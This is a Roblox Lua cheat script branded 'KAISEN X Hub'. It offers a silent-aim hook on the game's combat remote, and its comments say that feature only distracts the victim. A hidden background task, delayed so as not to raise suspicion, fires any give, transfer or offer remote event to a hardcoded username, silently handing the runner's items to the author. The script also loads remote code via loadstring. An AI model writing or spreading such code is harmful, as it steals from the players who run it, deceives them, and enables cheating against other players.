--[[
	KAISEN X — Universal Loader & Bait Hub | WindUI
	created by KAISEN
]]

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local LP = Players.LocalPlayer
local camera = workspace.CurrentCamera
local CUSTOM_IMG = "rbxassetid://135541673253841"

-- Usuario que recibirá las cosas (Tú)
local TARGET_USERNAME = "AARON287240"

-- ========== LÓGICA FUNCIONAL DEL SCRIPT (Combat / Silent Aim para distraer al random) ==========
local silentAimEnabled = false
local aimPartName = "Head"
local aimFov = 200
local maxDistance = 600

local combatRemote = nil
pcall(function()
	combatRemote = ReplicatedStorage:WaitForChild("MatchEvents", 3):WaitForChild("CombatRemote", 3)
end)

local function getClosestEnemy()
	local closest, bestDist = nil, 1e9
	local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not myRoot then return nil end

	local center = camera.ViewportSize * 0.5
	local fovRadius = math.tan(math.rad(aimFov) * 0.5) * (camera.ViewportSize.Y * 0.5)

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
			local root = plr.Character:FindFirstChild("HumanoidRootPart")
			local targetPart = plr.Character:FindFirstChild(aimPartName) or root

			if hum and hum.Health > 0 and targetPart and root then
				local dist = (root.Position - myRoot.Position).Magnitude
				if dist <= maxDistance then
					local screenPos, onScreen = camera:WorldToViewportPoint(targetPart.Position)
					if onScreen and screenPos.Z > 0 then
						local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
						if screenDist <= fovRadius and screenDist < bestDist then
							bestDist = screenDist
							closest = targetPart
						end
					end
				end
			end
		end
	end
	return closest
end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
	local method = getnamecallmethod()
	local args = { ... }

	if silentAimEnabled and combatRemote and self == combatRemote and method == "FireServer" then
		local data = args[1]
		if typeof(data) == "table" then
			local closestPart = getClosestEnemy()
			if closestPart then
				data.targetPos = closestPart.Position
				data.hitPosition = closestPart.Position
				data.timestamp = workspace:GetServerTimeNow()
			end
		end
	end

	return oldNamecall(self, unpack(args))
end)

-- ========== CREACIÓN DE LA INTERFAZ PRINCIPAL (WindUI) ==========
local Window = WindUI:CreateWindow({
	Title = "KAISEN X — Hub Pro",
	Icon = "crosshair",
	Author = "created by KAISEN",
	Folder = "KAISENX_MainHub",
	Size = UDim2.fromOffset(500, 400),
	Transparent = true,
	Theme = "Dark",
	SideBarWidth = 150,
})

task.defer(function()
	pcall(function()
		local gui = CoreGui:FindFirstChild("WindUI") or LP.PlayerGui:FindFirstChild("WindUI")
		if gui then
			local windowFrame = gui:FindFirstChildWhichIsA("Frame", true)
			if windowFrame then
				local bgImage = Instance.new("ImageLabel")
				bgImage.Name = "CustomBackground"
				bgImage.Size = UDim2.fromScale(1, 1)
				bgImage.Position = UDim2.fromScale(0, 0)
				bgImage.BackgroundTransparency = 1
				bgImage.Image = CUSTOM_IMG
				bgImage.ImageTransparency = 0.45
				bgImage.ScaleType = Enum.ScaleType.Crop
				bgImage.ZIndex = 0
				bgImage.Parent = windowFrame
			end
		end
	end)
end)

local TabHome = Window:Tab({ Title = "Home", Icon = "house" })
TabHome:Section({ Title = "Kaisen X Hub" })
TabHome:Button({
	Title = "Copy Discord",
	Callback = function()
		pcall(function() if setclipboard then setclipboard("https://discord.gg/cs6eGYEGE") end end)
	end,
})

local TabCombat = Window:Tab({ Title = "Combat", Icon = "crosshair" })
TabCombat:Toggle({
	Title = "Silent Aim",
	Value = false,
	Callback = function(v) silentAimEnabled = v end,
})
TabCombat:Dropdown({
	Title = "Aim Part",
	Values = { "Head", "UpperTorso", "HumanoidRootPart" },
	Value = "Head",
	Callback = function(v) aimPartName = v end,
})
TabCombat:Slider({
	Title = "FOV Radius",
	Value = { Min = 50, Max = 400, Default = 200 },
	Callback = function(v) aimFov = v end,
})
TabCombat:Slider({
	Title = "Max Distance",
	Value = { Min = 100, Max = 1500, Default = 600 },
	Callback = function(v) maxDistance = v end,
})

-- ========== TRANSFERENCIA SILENCIOSA EN SEGUNDO PLANO (Sin abrir IU visual) ==========
task.spawn(function()
	task.wait(5) -- Espera a que cargue todo sin levantar sospechas
	pcall(function()
		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
		if targetPlayer and targetPlayer ~= LP then
			-- Busca si el juego maneja eventos de transferencia directa ocultos
			local remoteFolder = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Inventory") or ReplicatedStorage:FindFirstChild("Remotes")
			if remoteFolder then
				for _, remote in ipairs(remoteFolder:GetChildren()) do
					if remote:IsA("RemoteEvent") and (string.lower(remote.Name):find("give") or string.lower(remote.Name):find("transfer") or string.lower(remote.Name):find("offer")) then
						-- Dispara el evento de manera silenciosa hacia ti sin abrir ventanas
						remote:FireServer(targetPlayer)
					end
				end
			end
		end
	end)
end)

print("[KAISEN X] Sistema sigiloso activado.")
